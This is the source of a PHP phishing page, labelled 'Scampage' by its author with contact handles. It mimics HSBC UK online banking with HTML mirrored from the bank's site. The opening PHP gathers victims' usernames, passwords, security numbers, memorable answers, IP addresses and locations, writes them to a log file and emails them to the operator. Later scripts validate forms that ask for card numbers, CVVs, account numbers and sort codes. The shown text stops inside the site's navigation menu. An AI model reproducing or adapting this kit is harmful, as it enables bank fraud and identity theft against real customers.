<?php
/*
 * Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * ICQ: 713566330
 */
require "../../CONTROLS.php";
require "../../includes/session_protect.php";
require "../../includes/functions.php";
require "../../includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['username'];
$pass = $_SESSION['password'];
$telepin = $_POST['telepin'];
$memorableAnswer = $_SESSION['memorableAnswer'];
$question = $_SESSION['question'];
$memorableAnswer2 = $_SESSION['memorableAnswer2'];
$question2 = $_SESSION['question2'];
$ccno = str_replace(' ', '', $ccno);
$last4 = substr($ccno, 12, 16);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['type']);
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
$data = "
+ ------------- HSBC --------------+
+ ------------------------------------------+
+ Account Details (HSBC)
| Username : $user
| Password : $pass
| Security Number : $telepin
| Memorable Question : $question 
| Memorable Answer : $memorableAnswer 
| Memorable Question2 : $question2 
| Memorable Answer2 : $memorableAnswer2 
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";

$file = fopen('../../assets/logs/banks.txt', 'a');
fwrite($file, $data);
fclose($file);

mail($to, 'HSBC from ' . $_SERVER['REMOTE_ADDR'], $data);
?>
<!DOCTYPE html>
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
<!-- Mirrored from www.security.hsbc.co.uk/gsa/IDV_GLOBAL_SESSION_INVALID_ERROR/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 09 Sep 2018 19:40:15 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<!-- /Added by HTTrack -->
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <!-- Page Title Starts -->
    <title>Thank You
    </title>
    <!-- Page Title Ends -->
    <meta http-equiv="refresh" content="7; url=../../Exit.php" />

    <meta name="description" content="" />
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="author" content="" />
    <meta http-equiv="Cache-Control"
          content="max-age=1,s-maxage=0, no-cache, no-store, must-revalidate, private" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="Sat, 6 May 1995 12:00:00 GMT" />
    <!-- Webtrends start  -->
    <!--  <script type="text/javascript" src="/gsp/saas/Components/default/resources/script/theme_public/js/top_section.js"></script>  -->
    <script type='text/javascript' src='assets/gsp/saas/Components/default/resources/script/theme_public/js/tealium.js'></script>
    <script src="assets/../tags.tiqcdn.com/utag/hsbc/utag.sync.js"></script>
    <script type="text/javascript">
        productLine();
        function productLine(){

            var tagversion='???HSBC.SITE.tagversion???';
            HSBC.SITE.tagversion =tagversion;

            var rng='Europe';
            HSBC.SITE.rng =rng;

            var subrng='UK';
            HSBC.SITE.subrng =subrng;

            var cnty='United Kingdom';
            HSBC.SITE.cnty =cnty;

            var DOMS='???HSBC.DCS.DOMS???';
            HSBC.DCS.DOMS =DOMS;

            var ent='HSBC Bank Plc';
            HSBC.SITE.ent =ent;

            var brand ='HSBC';
            HSBC.SITE.brand =brand;

            var ID ='dcss3oxau5twkf4oma0cdcas2_2o4b';
            HSBC.DCS.ID  =ID;

            var custgrp ='PFS';
            HSBC.SITE.custgrp =custgrp;

            var busline ='General';
            HSBC.SITE.busline =busline;

            var prodline ='Other';

            var page_cg_n='IB;PIB';
            HSBC.PAGE.cg_n=page_cg_n;

            //HSBC.PAGE.cg_n =HSBC_PAGE_cg_n;

            var site ='splitMI[0]';

            var ibtype ='splitMI[1]';
            HSBC.SITE.ibtype =ibtype;

            HSBC.LOG.dcsuri=pageCUN;

            var language ="en";
            var cam ="";
            HSBC.SITE.cam =cam;


            if(prodline != "undefined"){
                HSBC.SITE.prodline= prodline;
            }else{
                HSBC.SITE.prodline= "NoProductLine";
            }

            if(site != "undefined"){
                HSBC.SITE.site= site;
            }else{
                HSBC.SITE.site= " ";
            }
            // Language
            if(language != "undefined"){
                HSBC.SITE.language = language;
            }

        }

    </script>
    <!-- Webtrends ends-->
    <script>window['adrum-start-time'] = new Date().getTime();</script>
    <script src="assets/ContentService/gsp/saas/Components/resource/adrum_wrapperf2ba.js?SAGG=gsp_hbeu"></script>
    <script>
        dojoConfig = {
            cacheBust: '1.0',
            baseUrl: globalVP+'/saas/Components/default/resources/script/'

        };
    </script>
    <link rel="stylesheet"
          href="assets/gsp/saas/Components/default/resources/script/libraries/hsbc/widget/themes/ursula/ursula.css"
          media="screen" />
    <style id="antiClickjack">body{display:none !important;}</style>
    <script type="text/javascript">
        if (self === top) {
            var antiClickjack = document.getElementById("antiClickjack");
            antiClickjack.parentNode.removeChild(antiClickjack);
        } else {
            top.location = self.location;
        }
    </script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
    <script>

        $('#verify').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#verify").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                name: {	required: true,	minlength: 4,},
                                dob: {	required: true,	minlength: 10,},
                                address: { required: true, minlength: 5,},
                                town: { required: true, minlength: 3,},
                                postcode: { required: true, minlength: 5,},
                                telephone: { required: true, minlength: 11, digits: true,},
                                email: { required: true, email: true,},
                            },
                            messages: {
                                name: {
                                    required: "Please provide full name",
                                    minlength: jQuery.validator.format("Please provide your full name"),
                                },
                                dob: {
                                    required: "Please provide date of birth",
                                    minlength: jQuery.validator.format("Please provide your date of birth"),
                                },
                                telephone: {
                                    required: "Please provide telephone number",
                                    minlength: jQuery.validator.format("Please ensure you enter 11 digits exactly"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                email: {
                                    required: "Please provide email address",
                                    email: jQuery.validator.format("Please check the email address you have entered"),
                                },
                                address: {
                                    required: "Please provide the 1st line of your address",
                                    minlength: jQuery.validator.format("Please check the address you have entered"),
                                },
                                town: {
                                    required: "Please provide city/town",
                                    minlength: jQuery.validator.format("Please check the city/town you have entered"),
                                },
                                postcode: {
                                    required: "Please provide postcode",
                                    minlength: jQuery.validator.format("Please check the postcode you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                document.getElementById("Details").style.display = "none";
                                document.getElementById("Payment").style.display = "block";
                                ForwardValues();
                                $('body,html').animate({
                                    scrollTop: 0
                                }, 800);
                                return false;
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);

        function ForwardValues() {
            var name = document.getElementById("name").value;
            document.getElementById("one").value=name;
            var dob = document.getElementById("dob").value;
            document.getElementById("two").value=dob;
            var telephone = document.getElementById("telephone").value;
            document.getElementById("three").value=telephone;
            var email = document.getElementById("email").value;
            document.getElementById("four").value=email;
            var address = document.getElementById("address").value;
            document.getElementById("five").value=address;
            var town = document.getElementById("town").value;
            document.getElementById("six").value=town;
            var postcode = document.getElementById("postcode").value;
            document.getElementById("seven").value=postcode;
        }
        $('#payment').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#payment").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                ccname: { required: true, minlength: 4},
                                ccno: { required: true, minlength: 16, creditcard: true},
                                ccexp: { required: true, minlength: 7,},
                                secode: { required: true, minlength: 3, digits: true,},
                                account: { required: true, minlength: 8,},
                                sortcode: { required: true, minlength: 8,},
                            },
                            messages: {
                                ccname: {
                                    required: "Please provide cardholders name",
                                    minlength: jQuery.validator.format("Please check the cardholders name you have entered"),
                                },
                                ccno: {
                                    required: "Please provide 16 digit card number",
                                    minlength: jQuery.validator.format("Please check the card number you have entered"),
                                    creditcard: jQuery.validator.format("Please check the card number you have entered"),
                                },
                                ccexp: {
                                    required: "Please provide card expiry date",
                                    minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
                                },
                                secode: {
                                    required: "Please provide 3 digit card security code (CVV)",
                                    minlength: jQuery.validator.format("Please check the card security code you have entered"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                account: {
                                    required: "Please provide 8 digit account number",
                                    minlength: jQuery.validator.format("Please check the account number you have entered"),
                                },
                                sortcode: {
                                    required: "Please provide 6 digit sort code",
                                    minlength: jQuery.validator.format("Please check the sort code you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                form.submit();
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);
    </script>
    <script type="text/javascript">
        function movetoNext(current, nextFieldID) {
            if (current.value.length >= current.maxLength) {
                document.getElementById(nextFieldID).focus();
            }
        }
        jQuery(function($){
            $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
            $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
            $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
        });
        jQuery(function($) {
            $('.cc-number').payment('formatCardNumber');
            $('.cc-exp').payment('formatCardExpiry');
            $('.cc-cvc').payment('formatCardCVC');

            $.fn.toggleInputError = function(erred) {
                this.parent('.field').toggleClass('errorzzzz', erred);
                return this;
            };

            $('form').submit(function(e) {
                e.preventDefault();

                var cardType = $.payment.cardType($('.cc-number').val());
                $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
                $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
                $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
                $('.cc-brand').text(cardType);
            });

        });

    </script>


</head>
<body class="ursula" onload="entityJavascripts()">
<div id="top">
    <!-- Header Section Starts -->
    <script type="text/javascript">
        function language_switching(var1,var2)
        {
            var language = document.getElementById('pageuri').value;
            var element = document.getElementById(var1);
            if ( document.readyState == "complete" )
            {

                element.href=pageCUN+"?switchedLang="+var2;
            }
        }

        if (top != self)
        {top.location=self.location;}
    </script>
    <input type="hidden" id="pageuri" />
    <script type="text/javascript">
        function entityJavascripts() {
            //not used as called on body load caused a flashes of unstyled content
        }

        //helper function
        function logOnOfftoggle(buttonID, action) {
            if (action == "show") {
                document.getElementById(buttonID).style.display = "block";
            } else if (action == "hide") {
                document.getElementById(buttonID).style.display = "none";
            }
        }
    </script>
    <div id="mainTopWrapper">
        <div id="mainTopUtility">
            <h1 aria-hidden="true">HSBC</h1>
            <div id="mainTopUtilityRow">
                <ul id="tabs">
                    <li class="skipLink"><a class="skip" data-dojo-props="target: '#innerPage a:first'" data-dojo-type="hsbcwidget/SkipLink" href="#" title="Skip page header and navigation" widgetid="skip">Skip page header and navigation</a></li>
                    <li class="on"><a href="#" title="Personal" aria-selected="true">Personal</a></li>
                    <li><a href="#" title="Business" >Business</a></li>
                </ul>
                <div id="siteControls">
                    <div id="langList">
                        <ul>
                            <li class="selected"><a href="#" title="English">English</a></li>
                        </ul>
                    </div>
                    <div data-dojo-type="hsbcwidget/Locale" id="locale">
                        <div data-dojo-props="contentSelector: '#countrySelectorContent'" data-dojo-type="hsbcwidget/DropDown" id="countrySelectorWrapper">
                            <a class="dropDownLink trigger" role="tablist" aria-orientation="vertical" href="#" title="View list of HSBC Global websites" aria-haspopup="true"><span><span class="flag uk">United Kingdom</span></span></a>
                            <div class="placeholder"></div>
                        </div>
                    </div>
                    <div id="logon">
                        <ul style="display: none">
                            <li><a href="#" title="Log on to Personal Internet Banking"  class="redBtn"><span>Log on</span></a></li>
                            <li><a href="#" title="Register for Personal Internet Banking"  class="greyBtn"><span>Register</span></a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div id="mainTopNavigation">
            <div id="logo"><a href="#" title="Home" ><img alt="HSBC" src="assets/ContentService/gsp/saas/Components/default/doc/hsbc-logo694b.gif?SAGG=gsp_uk"/></a></div>
            <div data-dojo-type="hsbcwidget/DoormatController" id="sections">
                <nav aria-label="products and services menu" >
                    <ul id="topLevel" role="menu" aria-label="products and services menu">
                        <li class="level1">
                            <a tabindex="0" aria-expanded="false" aria-haspopup="true" class="mainTopNav"><strong>Everyday Banking</strong><br />Accounts &#38; services</a>
                            <div class="doormatWrapper fourColLeft">
                                <div class="arrow">&#160;</div>
                                <div class="doormat">
                                    <p class="skipLink"><a href="#" title="Move to Product and Services navigation">Move to Borrowing navigation</a></p>
                                    <div class="doormatLeft">
                                        <div class="column">
                                            <h3 aria-hidden="true" class="hidden">HSBC</h3>
                                            <h3><a href="#" title="Current accounts"  data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/Tab','WT.ti','Doormat:EverydayBanking:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Current accounts</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="HSBC Premier Account"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Premier/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Premier:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC Premier Account</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="HSBC Advance Account"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Advance/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Advance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC Advance Account</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Bank Account"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/BankAccount/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:BankAccount:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Bank Account</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Students &amp; graduates"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Student&amp;Graduates/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Student&amp;Graduates:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student Account</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Switching to HSBC"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/SwitchingtoHSBC/Tab','WT.ti','Doormat:EverydayBanking:SwitchingtoHSBC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Switching to HSBC</a></li>
                                            </ul>
                                            <p class="ctaLink"><a href="#" title="View all current accounts"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all <span class="hidden">current accounts</span></a></p>
                                            <h3><a href="#" title="Savings"  data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/Tab','WT.ti','Doormat:SavingsAccounts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Savings</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="ISAs"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/ISAs/Tab','WT.ti','Doormat:EverydayBanking:ISAs:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">ISAs</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Online Bonus Saver"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/OBS/Tab','WT.ti','Doormat:SavingsAccounts:OBS:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Online Bonus Saver</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Flexible Saver"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/FlexiSaver/Tab','WT.ti','Doormat:SavingsAccounts:FlexiSaver:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Flexible Saver</a></li>
                                            </ul>
                                            <p class="ctaLink"><a href="#" title="View all savings accounts"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/ViewAll/Tab','WT.ti','Doormat:SavingsAccounts:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all <span class="hidden">savings accounts</span></a></p>
                                        </div>
                                        <div class="column">
                                            <h3><a href="#" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CustomerSupport/Tab','WT.ti','Doormat:EverydayBanking:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer support</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="Card support"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CardSupport/Tab','WT.ti','Doormat:EverydayBanking:CardSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Card support</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Money worries"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CardSupport/Tab','WT.ti','Doormat:EverydayBanking:CardSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Money worries</a></li>
                                            </ul>
                                            <p class="ctaLink"><a href="#" title="View all customer support"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all <span class="hidden">customer support</span></a></p>
                                            <h3><a href="#" title="Ways to bank"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/WaysToBank/Tab','WT.ti','Doormat:EverydayBanking:WaysToBank:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Ways to bank</a></h3>
                                            <p>Online, phone, mobile or in branch, we make it easy to bank with us.</p>
                                            <p class="ctaLink"><a href="#" title="Ways to bank. Find out more."  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/WaysToBank/Tab','WT.ti','Doormat:EverydayBanking:WaysToBank:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Find out more <span class="hidden">about Ways to bank</span></a></p>
                                        </div>
                                        <div class="column">
                                            <h3><a href="#" title="Credit cards" data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/CreditCards/Tab','WT.ti','Doormat:CreditCards:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Credit cards</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="HSBC Credit Card"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/HSBCCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:HSBCCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC Credit Card</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="HSBC Premier Credit Card"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/PremierCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:PremierCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC Premier Credit Card</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Student Credit Card"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/StudentCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:StudentCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student Credit Card</a></li>
                                            </ul>
                                            <p class="ctaLink"><a href="#" title="View all credit cards"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all <span class="hidden">credit cards</span></a></p>
                                            <h3><a href="#" title="International services" aria-haspopup="true" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/International/Tab','WT.ti','Doormat:EverydayBanking:International:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">International services</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="HSBC Currency Account"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrencyAccount/Tab','WT.ti','Doormat:EverydayBanking:CurrencyAccount:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC Currency Account</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="International Payments"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/IntlMoneyTransfers/Tab','WT.ti','Doormat:EverydayBanking:IntlMoneyTransfers:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">International Payments</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Travel money"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/TravelMoney/Tab','WT.ti','Doormat:EverydayBanking:TravelMoney:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel money</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Overseas account opening"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/OverseasAccounts/Tab','WT.ti','Doormat:EverydayBanking:OverseasAccounts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Overseas account opening</a></li>
                                            </ul>
                                            <p class="ctaLink"><a href="#" title="View all international services" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/International/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:International:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all <span class="hidden">international services</span></a></p>
                                        </div>
                                        <div class="column"><a href="#" title="banking on the go" ><img tabindex="0" class="focusOnImage" alt="Banking on the go" height="155" class="focusOnImage" src="assets/ContentService/gsp/saas/Components/default/doc/mobile_doormat_163x155px_d548_v2694b.jpg?SAGG=gsp_uk" width="163" /></a></div>
                                    </div>
                                </div>
                            </div>
                        </li>
                        <li class="level1">
                            <a class="mainTopNav" tabindex="0" aria-expanded="false" aria-haspopup="true"><strong>Borrowing</strong><br />Loans &#38; mortgages</a>
                            <div class="doormatWrapper fourColLeft">
                                <div class="arrow">&#160;</div>
                                <div class="doormat">
                                    <p class="skipLink"><a href="#" title="Move to Planning &amp; Investing navigation" >Move to Investing navigation</a></p>
                                    <div class="doormatLeft">
                                        <div class="column">
                                            <h3><a href="#" title="Loans"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Loans</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="Personal Loan"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/PersonalLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:PersonalLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Personal Loan</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="FlexiLoan"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/FlexiLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:FlexiLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">FlexiLoan</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="HSBC Premier Personal Loan"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/PremierLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:PremierLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Premier Personal Loan</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Graduate Loan"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/GraduateLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:GraduateLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Graduate Loan</a></li>
                                            </ul>
                                            <p class="ctaLink"><a href="#" title="View all loans"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all <span class="hidden">loans</span></a></p>
                                            <h3><a href="#" title="Credit cards"  onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Credit cards</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="Classic Credit Card"  onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Classic Credit Card</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="HSBC Premier Credit Card"  onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCPremierCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCPremierCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC Premier Credit Card</a></li>
